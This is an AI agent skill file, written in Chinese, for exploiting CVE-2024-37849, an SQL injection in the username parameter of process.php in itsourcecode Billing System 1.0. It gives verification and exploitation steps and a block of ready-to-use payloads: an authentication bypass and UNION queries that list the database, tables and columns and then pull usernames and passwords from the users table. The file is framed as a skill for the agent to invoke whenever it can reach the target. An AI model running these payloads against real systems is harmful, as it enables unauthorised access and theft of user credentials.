---
name: poc-itsourcecode-billing-system-cve-2024-37849
description: 针对 CVE-2024-37849 的详细分析与 PoC 触发技能。当你具备访问itsourcecode Billing System 1.0的process.php文件时，使用此SKILL。
---
验证漏洞存在方法
    - 尝试在username参数中注入SQL语句，如：' OR '1'='1
    - 观察系统响应是否出现数据库错误信息或异常行为
    - 检查是否能够绕过身份验证

漏洞利用方法
    - 通过process.php文件的username参数进行SQL注入攻击
    - 构造恶意SQL语句来执行任意数据库操作
    - 利用该漏洞可以执行任意代码或获取敏感数据
    - 由于是本地攻击，攻击者需要能够访问目标系统的process.php接口

PoC示例：
```sql
# 基础SQL注入测试
username=' OR '1'='1

# 联合查询获取数据库信息
username=' UNION SELECT 1,2,database()-- 

# 获取表名
username=' UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema=database()-- 

# 获取列名
username=' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- 

# 获取用户数据
username=' UNION SELECT 1,username,password FROM users-- 
```

注意：实际利用时需根据目标系统的具体数据库结构和表名进行调整。